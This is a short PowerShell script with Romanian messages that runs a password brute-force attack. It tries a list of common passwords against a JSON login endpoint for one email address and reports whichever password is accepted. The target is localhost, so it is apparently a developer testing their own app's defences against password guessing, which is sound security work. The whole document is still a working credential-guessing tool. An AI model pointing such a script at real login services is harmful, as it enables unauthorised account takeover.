$passwords = @("abc", "123", "password", "admin", "1234", "123456", "pavlo", "test")
$email = "test@test.com"

Write-Host "Incep atacul brute force pe $email..." -ForegroundColor Yellow

foreach ($pass in $passwords) {
    try {
        $body = '{"email":"' + $email + '","password":"' + $pass + '"}'
        $response = Invoke-RestMethod -Uri "http://localhost:3000/api/auth/login" -Method POST -ContentType "application/json" -Body $body
        Write-Host "PAROLA GASITA: $pass" -ForegroundColor Green
        Write-Host "Raspuns: $($response | ConvertTo-Json)"
        break
    } catch {
        Write-Host "Incercare $pass -> ESUATA" -ForegroundColor Red
    }
}